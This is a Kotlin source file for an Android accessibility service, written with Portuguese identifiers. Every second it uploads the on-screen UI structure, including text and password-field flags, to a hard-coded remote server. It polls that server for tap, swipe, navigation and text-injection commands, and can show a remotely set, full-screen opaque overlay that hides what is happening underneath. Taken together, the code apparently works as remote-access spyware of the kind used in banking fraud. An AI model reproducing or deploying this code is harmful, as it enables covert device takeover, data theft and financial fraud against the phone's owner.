package com.meuacesso.remoto

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Rect
import android.graphics.Path
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.TextView
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL


class ControleGestosService : AccessibilityService() {

    companion object {
        const val URL_VPS = "https://servidorpremium-kl.lat"
        const val URL_ENVIAR_ESTRUTURA = "${URL_VPS}/receber_esqueleto"
        const val URL_BUSCAR_COMANDOS = "${URL_VPS}/obter_comando"
        const val URL_BUSCAR_OVERLAY = "${URL_VPS}/obter_overlay"

        private const val INTERVALO_ATUALIZACAO = 1000L
        private const val CANAL_NOTIFICACAO = "servico_controle_remoto"
        private const val ID_NOTIFICACAO = 9999
    }

    private var jobPrincipal: Job? = null
    private var overlayView: View? = null
    private var parametrosOverlay: WindowManager.LayoutParams? = null
    private lateinit var windowManager: WindowManager

    private var overlayAtivo = false
    private var mensagemOverlayAtual = ""
    private var textoInferiorOverlayAtual = ""
    private var logoOverlayAtual = ""

    override fun onServiceConnected() {
        super.onServiceConnected()
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        criarCanalNotificacao()
        iniciarServicoEmPrimeiroPlano()
        iniciarLoopPrincipal()
        Log.i("KL", "Serviço de acessibilidade iniciado")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {}

    override fun onInterrupt() {
        Log.w("KL", "Acessibilidade interrompida")
    }

    override fun onDestroy() {
        pararServico()
        super.onDestroy()
    }

    private fun iniciarLoopPrincipal() {
        jobPrincipal = CoroutineScope(Dispatchers.IO).launch {
            while (true) {
                try {
                    val raiz = rootInActiveWindow
                    if (raiz != null) {
                        val estrutura = extrairEstruturaTela(raiz)
                        enviarEstruturaParaServidor(estrutura)
                        raiz.recycle()
                    } else {
                        Log.w("KL", "rootInActiveWindow nulo")
                    }

                    verificarComandosRecebidos()
                    verificarOverlay()

                } catch (e: Exception) {
                    Log.e("KL", "Erro no loop: ${e.message}")
                }
                delay(INTERVALO_ATUALIZACAO)
            }
        }
    }

    // ─── Extração de elementos da tela ───────────────────────────────────────

    private fun extrairEstruturaTela(raiz: AccessibilityNodeInfo): String {
        val listaElementos = mutableListOf<Map<String, Any>>()
        val displayMetrics = resources.displayMetrics

        fun percorrerNo(no: AccessibilityNodeInfo) {
            val area = Rect()
            no.getBoundsInScreen(area)

            if (area.width() > 2 && area.height() > 2 && no.isVisibleToUser) {
                val className = no.className?.toString() ?: ""
                val isClickable = no.isClickable || no.isLongClickable
                val isEditable = no.isEditable
                val isCheckable = no.isCheckable
                val isPassword = no.isPassword
                val isEnabled = no.isEnabled
                val isChecked = no.isChecked

                val texto = no.text?.toString()?.trim() ?: ""
                val descricao = no.contentDescription?.toString()?.trim() ?: ""
                val dica = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    no.hintText?.toString()?.trim() ?: ""
                } else ""
                val recursoId = no.viewIdResourceName?.substringAfter("/") ?: ""

                val tipo = when {
                    isEditable || className.contains("EditText", ignoreCase = true) -> "campo_texto"
                    className.contains("ImageButton", ignoreCase = true) -> "botao"
                    className.contains("Button", ignoreCase = true) -> "botao"
                    className.contains("CheckBox", ignoreCase = true) ||
                            className.contains("Switch", ignoreCase = true) ||
                            className.contains("ToggleButton", ignoreCase = true) ||
                            isCheckable -> "selecao"
                    className.contains("ImageView", ignoreCase = true) -> "imagem"
                    className.contains("TextView", ignoreCase = true) -> "texto"
                    isClickable -> "clicavel"
                    else -> "outro"
                }

                val cor = when (tipo) {
                    "campo_texto" -> "#2196F3"
                    "botao"       -> "#4CAF50"
                    "texto"       -> "#424242"
                    "clicavel"    -> "#FF9800"
                    "imagem"      -> "#9C27B0"
                    "selecao"     -> "#F44336"
                    else          -> "#9E9E9E"
                }

                listaElementos.add(
                    mapOf(
                        "tipo"       to tipo,
                        "cor"        to cor,
                        "texto"      to texto,
                        "descricao"  to descricao,
                        "dica"       to dica,
                        "recurso_id" to recursoId,
                        "x"          to area.left,
                        "y"          to area.top,
                        "largura"    to area.width(),
                        "altura"     to area.height(),
                        "clicavel"   to isClickable,
                        "editavel"   to isEditable,
                        "senha"      to isPassword,
                        "ativo"      to isEnabled,
                        "marcado"    to isChecked
                    )
                )
            }

            for (i in 0 until no.childCount) {
                val filho = no.getChild(i) ?: continue
                percorrerNo(filho)
                @Suppress("DEPRECATION")
                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) filho.recycle()
            }
        }

        percorrerNo(raiz)

        val json = org.json.JSONObject().apply {
            put("id", Build.ID)
            put("modelo", "${Build.MANUFACTURER} ${Build.MODEL}".trim())
            put("fabricante", Build.MANUFACTURER)
            put("android", Build.VERSION.RELEASE)
            put("largura", displayMetrics.widthPixels)
            put("altura", displayMetrics.heightPixels)
            put("densidade", displayMetrics.densityDpi)
        }

        val elementosJson = org.json.JSONArray()
        listaElementos.forEach { elemento ->
            val obj = org.json.JSONObject()
            elemento.forEach { (chave, valor) -> obj.put(chave, valor) }
            elementosJson.put(obj)
        }
        json.put("elementos", elementosJson)

        return json.toString()
    }

    // ─── Comunicação com o servidor ──────────────────────────────────────────

    private fun enviarEstruturaParaServidor(dados: String) {
        CoroutineScope(Dispatchers.IO).launch {
            var conexao: HttpURLConnection? = null
            try {
                conexao = URL(URL_ENVIAR_ESTRUTURA).openConnection() as HttpURLConnection
                conexao.apply {
                    requestMethod = "POST"
                    doOutput = true
                    connectTimeout = 3000
                    readTimeout = 3000
                    setRequestProperty("Content-Type", "application/json; charset=utf-8")
                }
                OutputStreamWriter(conexao.outputStream, Charsets.UTF_8).use { it.write(dados) }
                val resposta = conexao.responseCode
                if (resposta != HttpURLConnection.HTTP_OK) {
                    Log.w("KL", "Estrutura: servidor retornou $resposta")
                }
            } catch (e: Exception) {
                Log.e("KL", "Erro ao enviar estrutura: ${e.message}")
            } finally {
                conexao?.disconnect()
            }
        }
    }

    private fun verificarComandosRecebidos() {
        var conexao: HttpURLConnection? = null
        try {
            val idDispositivo = Build.ID
            conexao = URL("$URL_BUSCAR_COMANDOS?id=$idDispositivo").openConnection() as HttpURLConnection
            conexao.apply {
                requestMethod = "GET"
                connectTimeout = 2000
                readTimeout = 2000
            }
            if (conexao.responseCode == HttpURLConnection.HTTP_OK) {
                val resposta = BufferedReader(InputStreamReader(conexao.inputStream, Charsets.UTF_8))
                    .readText().trim()
                if (resposta.isNotEmpty() && resposta != "nenhum") {
                    Log.d("KL", "Comando: $resposta")
                    Handler(Looper.getMainLooper()).post { processarComando(resposta) }
                }
            }
        } catch (e: Exception) {
            Log.e("KL", "Erro ao buscar comando: ${e.message}")
        } finally {
            conexao?.disconnect()
        }
    }

    private fun verificarOverlay() {
        var conexao: HttpURLConnection? = null
        try {
            val idDispositivo = Build.ID
            conexao = URL("$URL_BUSCAR_OVERLAY?id=$idDispositivo").openConnection() as HttpURLConnection
            conexao.apply {
                requestMethod = "GET"
                connectTimeout = 2000
                readTimeout = 2000
            }

            if (conexao.responseCode != HttpURLConnection.HTTP_OK) return

            val resposta = BufferedReader(InputStreamReader(conexao.inputStream, Charsets.UTF_8))
                .readText().trim()

            if (resposta.isEmpty()) {
                if (overlayAtivo) Handler(Looper.getMainLooper()).post { removerOverlay() }
                return
            }

            val json = org.json.JSONObject(resposta)
            val ativo = json.optBoolean("ativo", false)

            if (!ativo) {
                if (overlayAtivo) Handler(Looper.getMainLooper()).post { removerOverlay() }
                return
            }

            val mensagem = json.optString("mensagem", "Aguarde...")
            val textoInferior = json.optString("texto_inferior", "")
            val logo = json.optString("logo", "")

            Handler(Looper.getMainLooper()).post {
                mostrarOuAtualizarOverlay(mensagem, textoInferior, logo)
            }

        } catch (e: Exception) {
            Log.e("KL", "Erro ao verificar overlay: ${e.message}")
        } finally {
            conexao?.disconnect()
        }
    }

    // ─── Overlay ─────────────────────────────────────────────────────────────

    /**
     * Shows overlay if not visible, or updates content in-place to avoid flicker.
     * Must be called on the main thread.
     */
    private fun mostrarOuAtualizarOverlay(mensagem: String, textoInferior: String, logo: String) {
        // If overlay is already showing, just update the text — no window recreation, no flicker
        if (overlayAtivo && overlayView != null) {
            val changed = mensagem != mensagemOverlayAtual ||
                    textoInferior != textoInferiorOverlayAtual ||
                    logo != logoOverlayAtual
            if (!changed) return

            overlayView!!.findViewById<TextView>(R.id.txtMensagem)?.text = mensagem
            overlayView!!.findViewById<TextView>(R.id.txtTextoInferior)?.text = textoInferior
            mensagemOverlayAtual = mensagem
            textoInferiorOverlayAtual = textoInferior
            logoOverlayAtual = logo
            Log.d("KL", "Overlay atualizado sem recriação")
            return
        }

        criarOverlay(mensagem, textoInferior, logo)
    }

    private fun criarOverlay(mensagem: String, textoInferior: String, logo: String) {
        if (!Settings.canDrawOverlays(this)) {
            Log.e("KL", "Permissão SYSTEM_ALERT_WINDOW não concedida")
            return
        }

        val tipoJanela = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        } else {
            @Suppress("DEPRECATION")
            WindowManager.LayoutParams.TYPE_PHONE
        }

        val displayMetrics = resources.displayMetrics
        val screenWidth = displayMetrics.widthPixels
        val screenHeight = displayMetrics.heightPixels

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            tipoJanela,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
            PixelFormat.OPAQUE
        ).apply {
            gravity = Gravity.TOP or Gravity.START
            x = 0
            y = 0
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }
        }

        val view = LayoutInflater.from(this).inflate(R.layout.overlay_layout, null)
        // Force fully opaque white — belt-and-suspenders to prevent wallpaper bleed-through
        view.setBackgroundColor(Color.WHITE)
        view.findViewById<TextView>(R.id.txtMensagem)?.text = mensagem
        view.findViewById<TextView>(R.id.txtTextoInferior)?.text = textoInferior

        try {
            windowManager.addView(view, params)
            overlayView = view
            parametrosOverlay = params
            overlayAtivo = true
            mensagemOverlayAtual = mensagem
            textoInferiorOverlayAtual = textoInferior
            logoOverlayAtual = logo
            Log.i("KL", "Overlay criado — $mensagem")
        } catch (e: Exception) {
            Log.e("KL", "Erro ao criar overlay: ${e.message}")
            resetarEstadoOverlay()
        }
    }

    private fun removerOverlay() {
        overlayView?.let { view ->
            try {
                windowManager.removeView(view)
            } catch (e: Exception) {
                Log.w("KL", "Erro ao remover overlay: ${e.message}")
            }
        }
        overlayView = null
        parametrosOverlay = null
        resetarEstadoOverlay()
        Log.i("KL", "Overlay removido")
    }

    private fun resetarEstadoOverlay() {
        overlayAtivo = false
        mensagemOverlayAtual = ""
        textoInferiorOverlayAtual = ""
        logoOverlayAtual = ""
    }

    // ─── Comandos ─────────────────────────────────────────────────────────────

    private fun processarComando(comando: String) {
        val partes = comando.split("|", limit = 2)
        if (partes.isEmpty()) return

        when (partes[0].lowercase().trim()) {
            "toque" -> {
                val coords = partes.getOrNull(1)?.split(",") ?: return
                val x = coords.getOrNull(0)?.trim()?.toFloatOrNull() ?: return
                val y = coords.getOrNull(1)?.trim()?.toFloatOrNull() ?: return
                executarToque(x, y)
            }
            "arrastar" -> {
                val coords = partes.getOrNull(1)?.split(",") ?: return
                val x1 = coords.getOrNull(0)?.trim()?.toFloatOrNull() ?: return
                val y1 = coords.getOrNull(1)?.trim()?.toFloatOrNull() ?: return
                val x2 = coords.getOrNull(2)?.trim()?.toFloatOrNull() ?: return
                val y2 = coords.getOrNull(3)?.trim()?.toFloatOrNull() ?: return
                executarArrasto(x1, y1, x2, y2)
            }
            "rolar" -> {
                val coords = partes.getOrNull(1)?.split(",") ?: return
                val x1 = coords.getOrNull(0)?.trim()?.toFloatOrNull() ?: return
                val y1 = coords.getOrNull(1)?.trim()?.toFloatOrNull() ?: return
                val x2 = coords.getOrNull(2)?.trim()?.toFloatOrNull() ?: return
                val y2 = coords.getOrNull(3)?.trim()?.toFloatOrNull() ?: return
                executarArrasto(x1, y1, x2, y2)
            }
            "voltar"  -> performGlobalAction(GLOBAL_ACTION_BACK)
            "inicio"  -> performGlobalAction(GLOBAL_ACTION_HOME)
            "recentes"-> performGlobalAction(GLOBAL_ACTION_RECENTS)
            "texto"   -> inserirTexto(partes.getOrNull(1) ?: "")
            "mostrar_overlay" -> mostrarOuAtualizarOverlay(partes.getOrNull(1) ?: "", "", "")
            "esconder_overlay"-> removerOverlay()
        }
    }

    private fun executarToque(x: Float, y: Float) {
        val caminho = Path().apply { moveTo(x, y) }
        val gesto = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(caminho, 0L, 100L))
            .build()
        dispatchGesture(gesto, null, null)
    }

    private fun executarArrasto(x1: Float, y1: Float, x2: Float, y2: Float) {
        val caminho = Path().apply {
            moveTo(x1, y1)
            lineTo(x2, y2)
        }
        val gesto = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(caminho, 0L, 600L))
            .build()
        dispatchGesture(gesto, null, null)
    }

    private fun inserirTexto(texto: String) {
        if (texto.isBlank()) return

        val raiz = rootInActiveWindow ?: run {
            Log.e("KL", "Raiz da tela não encontrada para inserir texto")
            return
        }

        val campoAtivo = raiz.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
            ?: raiz.findFocus(AccessibilityNodeInfo.FOCUS_ACCESSIBILITY)

        if (campoAtivo == null) {
            Log.e("KL", "Nenhum campo de entrada em foco")
            raiz.recycle()
            return
        }

        val argumentos = Bundle().apply {
            putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, texto)
        }
        val sucesso = campoAtivo.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, argumentos)
        Log.i("KL", if (sucesso) "Texto inserido com sucesso" else "Falha ao inserir texto")

        @Suppress("DEPRECATION")
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) campoAtivo.recycle()
        raiz.recycle()
    }

    // ─── Serviço em primeiro plano ────────────────────────────────────────────

    private fun pararServico() {
        jobPrincipal?.cancel()
        jobPrincipal = null
        Handler(Looper.getMainLooper()).post { removerOverlay() }
        stopForeground(STOP_FOREGROUND_REMOVE)
    }

    private fun criarCanalNotificacao() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val canal = NotificationChannel(
                CANAL_NOTIFICACAO,
                "Controle Remoto",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Mantém o serviço ativo em segundo plano"
            }
            (getSystemService(NotificationManager::class.java))
                .createNotificationChannel(canal)
        }
    }

    private fun iniciarServicoEmPrimeiroPlano() {
        val notificacao = Notification.Builder(this, CANAL_NOTIFICACAO)
            .setContentTitle("KL Acesso Remoto Ativo")
            .setContentText("Monitorando tela e aguardando comandos")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setOngoing(true)
            .build()
        startForeground(ID_NOTIFICACAO, notificacao)
    }
}
